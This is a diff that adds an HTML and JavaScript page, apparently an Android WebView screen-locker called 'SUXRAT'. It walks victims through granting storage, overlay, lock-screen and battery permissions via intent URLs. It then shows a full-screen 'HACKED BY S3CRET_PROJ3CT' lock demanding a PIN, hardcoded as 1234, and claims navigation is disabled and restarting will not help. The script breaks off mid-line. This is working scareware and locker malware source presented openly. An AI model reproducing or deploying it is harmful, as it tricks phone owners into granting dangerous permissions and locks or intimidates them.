@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>SUXRAT - LOCK SCREEN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999999;
+        }
+        
+        /* LOCK SCREEN UTAMA */
+        .lock-container {
+            max-width: 100%;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            border: 3px solid #ff0000;
+            box-shadow: inset 0 0 50px rgba(255,0,0,0.3);
+            z-index: 1000000;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+        
+        .title {
+            color: #ff0000;
+            font-size: 3em;
+            font-weight: 900;
+            text-transform: uppercase;
+            text-shadow: 0 0 30px red, 0 0 60px rgba(255,0,0,0.5);
+            animation: blink 0.8s infinite;
+            letter-spacing: 3px;
+            line-height: 1.2;
+            word-break: break-word;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; text-shadow: 0 0 30px red; }
+            50% { opacity: 0.7; text-shadow: 0 0 50px red; }
+            100% { opacity: 1; text-shadow: 0 0 30px red; }
+        }
+        
+        .subtitle {
+            color: #ff6666;
+            font-size: 1.2em;
+            margin-top: 10px;
+            font-weight: 500;
+            letter-spacing: 2px;
+        }
+        
+        .pin-container {
+            width: 100%;
+            max-width: 350px;
+            margin: 30px auto;
+            text-align: center;
+        }
+        
+        .pin-label {
+            color: #ff0000;
+            font-size: 1.1em;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        
+        .pin-input {
+            width: 100%;
+            padding: 18px 20px;
+            font-size: 2.5em;
+            text-align: center;
+            background: #1a1a1a;
+            border: 3px solid #ff0000;
+            border-radius: 60px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            outline: none;
+            font-weight: 700;
+            letter-spacing: 12px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.3);
+        }
+        
+        .pin-input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 30px red;
+        }
+        
+        .btn-enter {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(145deg, #ff0000, #990000);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-size: 1.5em;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            box-shadow: 0 5px 25px rgba(255,0,0,0.5);
+            transition: all 0.1s ease;
+            border: 1px solid #ff6666;
+        }
+        
+        .btn-enter:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 15px red;
+        }
+        
+        .error-message {
+            color: #ff8888;
+            font-size: 1em;
+            margin-top: 15px;
+            min-height: 25px;
+            font-weight: 500;
+        }
+        
+        .warning-box {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 30px auto;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .warning-text {
+            color: #ff9999;
+            font-size: 0.9em;
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .warning-text strong {
+            color: #ff0000;
+            font-size: 1.1em;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 15px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #333;
+            font-size: 0.8em;
+            padding: 10px;
+        }
+        
+        .footer span {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        
+        /* PERMISSION SCREEN */
+        .permission-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 2000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: opacity 0.3s;
+            overflow-y: auto;
+        }
+        
+        .permission-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+            display: none;
+        }
+        
+        .permission-title {
+            color: #ff0000;
+            font-size: 2.2em;
+            font-weight: 800;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .permission-list {
+            width: 100%;
+            max-width: 380px;
+            margin: 10px 0;
+        }
+        
+        .permission-item {
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .permission-icon {
+            width: 48px;
+            height: 48px;
+            background: #2a2a2a;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 24px;
+        }
+        
+        .permission-info {
+            flex: 1;
+        }
+        
+        .permission-name {
+            color: white;
+            font-weight: 700;
+            font-size: 1em;
+        }
+        
+        .permission-desc {
+            color: #888;
+            font-size: 0.8em;
+            margin-top: 2px;
+        }
+        
+        .permission-status {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #ff4444;
+            margin: 0 8px;
+            box-shadow: 0 0 10px #ff4444;
+        }
+        
+        .permission-status.granted {
+            background: #44ff44;
+            box-shadow: 0 0 15px #44ff44;
+        }
+        
+        .permission-action {
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 8px 16px;
+            font-size: 0.8em;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        
+        .permission-action:active {
+            background: #990000;
+        }
+        
+        .permission-note {
+            color: #ffaa00;
+            font-size: 0.9em;
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: #1a1a1a;
+            border-radius: 16px;
+            border-left: 4px solid #ffaa00;
+            max-width: 380px;
+            width: 100%;
+        }
+        
+        .btn-continue {
+            background: linear-gradient(145deg, #ff0000, #990000);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            font-weight: bold;
+            border-radius: 60px;
+            width: 100%;
+            max-width: 380px;
+            margin-top: 20px;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(255,0,0,0.5);
+        }
+        
+        .btn-continue:active {
+            transform: scale(0.97);
+        }
+        
+        .btn-continue:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* TOMBOL NAVIGASI ANDROID DISABLE (SEBISA MUNGKIN) */
+        .disable-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 3000000;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- LAYER UNTUK BLOCK NAVIGASI -->
+    <div class="disable-nav" id="navBlocker"></div>
+    
+    <!-- PERMISSION SCREEN -->
+    <div class="permission-screen" id="permissionScreen">
+        <div class="permission-title">⚠️ SUXRAT SETUP ⚠️</div>
+        
+        <div class="permission-list">
+            <!-- STORAGE -->
+            <div class="permission-item">
+                <div class="permission-icon">📁</div>
+                <div class="permission-info">
+                    <div class="permission-name">Storage</div>
+                    <div class="permission-desc">Akses file & media</div>
+                </div>
+                <div class="permission-status" id="permStorage"></div>
+                <button class="permission-action" onclick="openPermission('storage')">SETTING</button>
+            </div>
+            
+            <!-- OVERLAY -->
+            <div class="permission-item">
+                <div class="permission-icon">🔒</div>
+                <div class="permission-info">
+                    <div class="permission-name">Overlay</div>
+                    <div class="permission-desc">Tampil di atas aplikasi</div>
+                </div>
+                <div class="permission-status" id="permOverlay"></div>
+                <button class="permission-action" onclick="openPermission('overlay')">SETTING</button>
+            </div>
+            
+            <!-- NOTIFICATION -->
+            <div class="permission-item">
+                <div class="permission-icon">🔔</div>
+                <div class="permission-info">
+                    <div class="permission-name">Notifications</div>
+                    <div class="permission-desc">Kirim notifikasi</div>
+                </div>
+                <div class="permission-status" id="permNotification"></div>
+                <button class="permission-action" onclick="openPermission('notification')">SETTING</button>
+            </div>
+            
+            <!-- HOME SCREEN SHORTCUT -->
+            <div class="permission-item">
+                <div class="permission-icon">🏠</div>
+                <div class="permission-info">
+                    <div class="permission-name">Home Shortcut</div>
+                    <div class="permission-desc">Buat shortcut di home</div>
+                </div>
+                <div class="permission-status" id="permHome"></div>
+                <button class="permission-action" onclick="openPermission('home')">SETTING</button>
+            </div>
+            
+            <!-- LOCK SCREEN -->
+            <div class="permission-item">
+                <div class="permission-icon">🔑</div>
+                <div class="permission-info">
+                    <div class="permission-name">Lock Screen</div>
+                    <div class="permission-desc">Tampil di layar kunci</div>
+                </div>
+                <div class="permission-status" id="permLock"></div>
+                <button class="permission-action" onclick="openPermission('lock')">SETTING</button>
+            </div>
+            
+            <!-- BATTERY OPTIMIZATION -->
+            <div class="permission-item">
+                <div class="permission-icon">⚡</div>
+                <div class="permission-info">
+                    <div class="permission-name">Battery Opt.</div>
+                    <div class="permission-desc">Nonaktifkan optimasi</div>
+                </div>
+                <div class="permission-status" id="permBattery"></div>
+                <button class="permission-action" onclick="openPermission('battery')">SETTING</button>
+            </div>
+        </div>
+        
+        <div class="permission-note" id="permissionNote">
+            ⚡ Berikan SEMUA permission di atas ⚡<br>
+            Klik SETTING untuk membuka halaman permission
+        </div>
+        
+        <div class="loader" id="permissionLoader"></div>
+        
+        <button class="btn-continue" id="continueBtn" onclick="continueToLock()" disabled>
+            ⏳ MENUNGGU PERMISSION...
+        </button>
+    </div>
+    
+    <!-- LOCK SCREEN -->
+    <div class="lock-container" id="lockScreen" style="display: none;">
+        <div class="header">
+            <div class="title">HACKED BY</div>
+            <div class="title">S3CRET_PROJ3CT</div>
+        </div>
+        
+        <div class="pin-container">
+            <div class="pin-label">MASUKKAN PIN</div>
+            <input type="password" class="pin-input" id="pinInput" maxlength="4" inputmode="numeric" autofocus>
+            <button class="btn-enter" id="enterBtn" onclick="checkPin()">ENTER</button>
+            <div class="error-message" id="errorMsg"></div>
+        </div>
+        
+        <div class="warning-box">
+            <div class="warning-text">
+                <strong>⚠️ PERMANENT LOCK ⚠️</strong><br><br>
+                • Tombol navigasi (◯ □ △) dinonaktifkan<br>
+                • Tidak bisa keluar tanpa PIN<br>
+                • Restart HP tidak akan membantu<br>
+                • Masukkan PIN yang benar untuk unlock
+            </div>
+        </div>
+        
+        <div class="footer">
+            <span>S3CRET_PROJ3CT</span> • SUXRAT v4.0
+        </div>
+    </div>
+    
+    <script>
+        // ============================================================
+        // GLOBAL VARIABLES
+        // ============================================================
+        let permissions = {
+            storage: false,
+            overlay: false,
+            notification: false,
+            home: false,
+            lock: false,
+            battery: false
+        };
+        
+        let isLocked = false;
+        const CORRECT_PIN = "1234";
+        
+        // ============================================================
+        // DOM ELEMENTS
+        // ============================================================
+        const permissionScreen = document.getElementById('permissionScreen');
+        const lockScreen = document.getElementById('lockScreen');
+        const continueBtn = document.getElementById('continueBtn');
+        const permissionLoader = document.getElementById('permissionLoader');
+        const permissionNote = document.getElementById('permissionNote');
+        const pinInput = document.getElementById('pinInput');
+        const errorMsg = document.getElementById('errorMsg');
+        const navBlocker = document.getElementById('navBlocker');
+        
+        // ============================================================
+        // FUNGSI BUKA HALAMAN PERMISSION ANDROID
+        // ============================================================
+        function openPermission(type) {
+            // Di WebView Android, ini akan membuka settings aplikasi
+            // Gunakan intent:// atau window.location untuk app settings
+            
+            let intentUrl = '';
+            
+            switch(type) {
+                case 'storage':
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=android.settings.APPLICATION_DETAILS_SETTINGS;end';
+                    break;
+                case 'overlay':
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
+                    break;
+                case 'notification':
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=android.settings.APP_NOTIFICATION_SETTINGS;end';
+                    break;
+                case 'home':
+                    intentUrl = 'intent://#Intent;package=com.android.launcher;action=android.intent.action.CREATE_SHORTCUT;end';
+                    break;
+                case 'lock':
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=android.settings.SECURITY_SETTINGS;end';
+                    break;
+                case 'battery':
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS;end';
+                    break;
+                default:
+                    intentUrl = 'intent://#Intent;package=com.android.settings;action=
